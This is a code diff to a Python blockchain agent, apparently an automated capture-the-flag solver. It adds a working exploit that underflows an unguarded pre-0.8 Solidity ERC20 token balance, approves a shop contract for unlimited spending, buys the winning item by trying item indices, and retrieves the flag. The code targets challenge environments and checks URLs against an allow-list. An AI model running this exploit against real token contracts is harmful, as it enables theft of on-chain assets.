@@ -52,6 +52,8 @@ class BlockchainAgent(BaseAgent):
             "onchain_history_analysis",
             "event_log_eavesdropping",
             "witnessed_calldata_replay",
+            "erc20_integer_underflow",
+            "unchecked_arithmetic_pre_0_8",
         ]
 
     def analyze_challenge(self, challenge: Dict[str, Any]) -> Dict[str, Any]:
@@ -238,6 +240,41 @@ class BlockchainAgent(BaseAgent):
                 },
             }
 
+        # ERC20 underflow purchase: pre-0.8 token whose `transfer` subtracts
+        # without a checked/SafeMath guard, so sending more than you hold
+        # underflows your balance to ~2**256. Inflate, then legitimately buy the
+        # item whose ownership `isSolved` checks. Discovered from source.
+        underflow_flag = self._try_erc20_underflow_purchase(
+            rpc_url=rpc_url,
+            private_key=private_key,
+            attacker_address=attacker_address,
+            target_address=target_address,
+            setup_address=setup_address,
+            flag_url=flag_url,
+            solidity_sources=solidity_sources,
+            steps=steps,
+        )
+        if underflow_flag:
+            return {
+                "challenge_id": challenge.get("id"),
+                "agent_id": self.agent_id,
+                "status": "solved",
+                "flag": underflow_flag,
+                "steps": steps,
+                "techniques": [
+                    "solidity_source_analysis",
+                    "erc20_integer_underflow",
+                    "unchecked_arithmetic_pre_0_8",
+                    "signed_web3_transactions",
+                ],
+                "artifacts": {
+                    "erc20_underflow": {
+                        "technique": "erc20_integer_underflow",
+                        "captured_sensitive_values": False,
+                    }
+                },
+            }
+
         # Source-driven attacker-contract drain: solves the "damage requires a
         # contract caller" pattern by reading the challenge's own contracts and
         # deploying a bespoke attacker. Runs before the legacy EOA-only lifecycle.
@@ -411,6 +448,199 @@ class BlockchainAgent(BaseAgent):
 
     def get_capabilities(self) -> List[str]:
         return self.capabilities
+
+    # -------------------------------------------------------- ERC20 underflow buy
+    _ERC20_MIN_ABI = [
+        {"name": "balanceOf", "inputs": [{"type": "address"}], "outputs": [{"type": "uint256"}],
+         "stateMutability": "view", "type": "function"},
+        {"name": "transfer", "inputs": [{"type": "address"}, {"type": "uint256"}],
+         "outputs": [{"type": "bool"}], "stateMutability": "nonpayable", "type": "function"},
+        {"name": "approve", "inputs": [{"type": "address"}, {"type": "uint256"}],
+         "outputs": [{"type": "bool"}], "stateMutability": "nonpayable", "type": "function"},
+    ]
+
+    def _try_erc20_underflow_purchase(
+        self,
+        *,
+        rpc_url: str,
+        private_key: Optional[str],
+        attacker_address: Optional[str],
+        target_address: Optional[str],
+        setup_address: Optional[str],
+        flag_url: Optional[str],
+        solidity_sources: Dict[str, str],
+        steps: List[str],
+    ) -> Optional[str]:
+        """Buy an unaffordable item by underflowing a pre-0.8 ERC20 balance.
+
+        Pattern (e.g. "Token to Wonderland"): ``isSolved`` checks ownership of a
+        priced item; buying calls the token's (safe) ``transferFrom``, but the
+        token's ``transfer`` subtracts without a checked/SafeMath guard on
+        Solidity <0.8, so ``transfer(x, balance + 1)`` underflows the caller's
+        balance to ~2**256. Inflate, approve, then buy the winning item. The buy
+        function, the winning item index, and the token address are all
+        discovered from source / on-chain storage.
+        """
+        if not all((rpc_url, private_key, target_address, flag_url)):
+            return None
+        joined = "\n".join(solidity_sources.values())
+        plan = self._discover_token_shop_purchase(joined)
+        if not plan:
+            return None
+
+        try:
+            import requests
+            from web3 import Web3
+            from eth_utils import keccak
+        except Exception as exc:  # pragma: no cover
+            steps.append(f"ERC20 underflow purchase unavailable (missing dependency): {exc}")
+            return None
+
+        assert_url_allowed(rpc_url)
+        assert_url_allowed(flag_url)
+        try:
+            web3 = Web3(Web3.HTTPProvider(rpc_url, request_kwargs={"timeout": 15}))
+            if not web3.is_connected():
+                return None
+            acct = web3.eth.account.from_key(private_key)
+            me = acct.address
+            shop = Web3.to_checksum_address(target_address)
+
+            token = self._find_token_in_storage(web3, shop, me)
+            if token is None:
+                steps.append("Could not locate the ERC20 token from the shop's storage slots.")
+                return None
+            erc20 = web3.eth.contract(address=token, abi=self._ERC20_MIN_ABI)
+            steps.append(
+                f"Detected pre-0.8 ERC20 shop; token at {token}, buy function "
+                f"{plan['buy_fn']}(uint256), winning item index {plan['item_index']}."
+            )
+
+            balance = int(erc20.functions.balanceOf(me).call())
+            burn = Web3.to_checksum_address("0x0000000000000000000000000000000000000001")
+            try:
+                self._send_web3_fn(web3, acct, erc20.functions.transfer(burn, balance + 1))
+            except Exception as exc:  # noqa: BLE001
+                steps.append(f"Underflow transfer reverted (token may be safe): {exc}")
+            new_balance = int(erc20.functions.balanceOf(me).call())
+            if new_balance <= balance:
+                steps.append("Balance did not underflow; the token is not vulnerable. Aborting.")
+                return None
+            steps.append(f"Underflowed the token balance from {balance} to ~2**256.")
+
+            self._send_web3_fn(web3, acct, erc20.functions.approve(shop, (1 << 256) - 1))
+
+            selector = keccak(f"{plan['buy_fn']}(uint256)".encode())[:4]
+            if plan["item_index"] is not None:
+                indices: List[int] = [plan["item_index"]]
+            else:
+                count = self._read_item_count(web3, shop)
+                indices = list(range(count)) if count else [0, 1, 2]
+            for index in indices:
+                if not self._replay_solve_arg(
+                    web3, acct, shop, selector, int(index).to_bytes(32, "big"), steps
+                ):
+                    continue
+                steps.append(f"Called {plan['buy_fn']}({index}).")
+                if self._verify_solved(web3, setup_address, shop, me, steps):
+                    break
+
+            if not self._verify_solved(web3, setup_address, shop, me, steps):
+                return None
+            response = requests.get(flag_url, timeout=10)
+            flag = find_first_flag(response.text if response.status_code == 200 else "")
+            if flag:
+                steps.append("Retrieved the flag after the underflow purchase.")
+                return flag
+            steps.append("Purchase verified on-chain but the flag endpoint returned no flag.")
+        except Exception as exc:  # noqa: BLE001
+            steps.append(f"ERC20 underflow purchase did not complete: {exc}")
+        return None
+
+    @staticmethod
+    def _discover_token_shop_purchase(joined_source: str) -> Optional[Dict[str, Any]]:
+        """Discover the buy function and winning item index for the shop pattern.
+
+        Requires Solidity <0.8 (so the token's arithmetic can underflow) and a
+        function taking a ``uint`` index that pays via ``transferFrom`` and
+        assigns ``.owner = msg.sender``.
+        """
+        if not joined_source:
+            return None
+        pragma = re.search(r"pragma\s+solidity\s+[^\d]*0\.(\d+)", joined_source)
+        if not pragma or int(pragma.group(1)) >= 8:
+            return None
+
+        buy_fn = None
+        for match in re.finditer(
+            r"function\s+(\w+)\s*\(\s*uint\d*\s+\w+\s*\)\s*(?:public|external)[^{]*\{(.*?)\n\s*\}",
+            joined_source,
+            re.S,
+        ):
+            body = match.group(2)
+            if "transferFrom" in body and re.search(r"owner\s*=\s*msg\.sender", body):
+                buy_fn = match.group(1)
+                break
+        if not buy_fn:
+            return None
+
+        item_index = None
+        solved = re.search(r"function\s+isSolved\b.*?\{(.*?)\n\s*\}", joined_source, re.S)
+        scope = solved.group(1) if solved else joined_source
+        idx_match = re.search(r"(?:viewItem|getItem|items)\s*\(\s*(\d+)\s*\)", scope)
+        if idx_match:
+            item_index = int(idx_match.group(1))
+
+        return {"buy_fn": buy_fn, "item_index": item_index}
+
+    def _find_token_in_storage(self, web3, shop, probe_address):
+        """Return the ERC20 token address held in one of the shop's storage slots."""
+        from web3 import Web3
+
+        for slot in range(0, 8):
+            try:
+                raw = bytes(web3.eth.get_storage_at(shop, slot))
+            except Exception:
+                continue
+            tail = raw[-20:]
+            if not int.from_bytes(tail, "big"):
+                continue
+            candidate = Web3.to_checksum_address(tail)
+            try:
+                if not web3.eth.get_code(candidate):
+                    continue
+                erc20 = web3.eth.contract(address=candidate, abi=self._ERC20_MIN_ABI)
+                erc20.functions.balanceOf(probe_address).call()
+                return candidate
+            except Exception:
+                continue
+        return None
+
+    @staticmethod
+    def _read_item_count(web3, shop) -> int:
+        """A public dynamic array stores its length in slot 0; used as a bound."""
+        try:
+            length = int.from_bytes(bytes(web3.eth.get_storage_at(shop, 0)), "big")
+            return length if 0 < length <= 64 else 0
+        except Exception:
+            return 0
+
+    @staticmethod
+    def _send_web3_fn(web3, acct, function, gas: int = 200_000) -> None:
+        """Build, sign, and send a contract call; raise if it reverts."""
+        tx = function.build_transaction({
+            "from": acct.address,
+            "nonce": web3.eth.get_transaction_count(acct.address),
+            "gas": gas,
+            "gasPrice": web3.eth.gas_price,
+            "chainId": web3.eth.chain_id,
+        })
+        signed = acct.sign_transaction(tx)
+        receipt = web3.eth.wait_for_transaction_receipt(
+            web3.eth.send_raw_transaction(signed.raw_transaction), timeout=60
+        )
+        if int(receipt.status) != 1:
+            raise RuntimeError("transaction reverted")
 
     # ---------------------------------------------------------- witnessed replay
     def _try_witnessed_calldata_replay(
